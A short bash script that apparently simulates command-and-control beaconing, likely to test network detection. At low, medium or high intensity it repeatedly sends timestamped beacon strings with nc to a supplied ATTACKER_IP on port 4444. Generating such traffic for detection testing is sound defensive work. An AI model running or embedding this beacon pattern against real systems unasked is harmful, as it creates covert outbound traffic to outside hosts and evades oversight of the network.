#!/usr/bin/env bash
set -euo pipefail

ATTACKER_IP="${1:?Usage: c2_beacon.sh <attacker_ip> <low|medium|high>}"
INTENSITY="${2:-medium}"

case "$INTENSITY" in
  low)    INTERVAL=30; COUNT=10 ;;
  medium) INTERVAL=10; COUNT=20 ;;
  high)   INTERVAL=3;  COUNT=40 ;;
  *) echo "intensity must be low|medium|high"; exit 1 ;;
esac

echo "=== c2_beacon ($INTENSITY) ==="
echo "target=${ATTACKER_IP}:4444 interval=${INTERVAL}s count=${COUNT}"
echo "start_ts=$(date -Iseconds)"

for i in $(seq 1 "$COUNT"); do
    echo "beacon-${i}-$(date +%s)" | timeout 2 nc "$ATTACKER_IP" 4444 || true
    sleep "$INTERVAL"
done

echo "end_ts=$(date -Iseconds)"
echo "=== c2_beacon complete ==="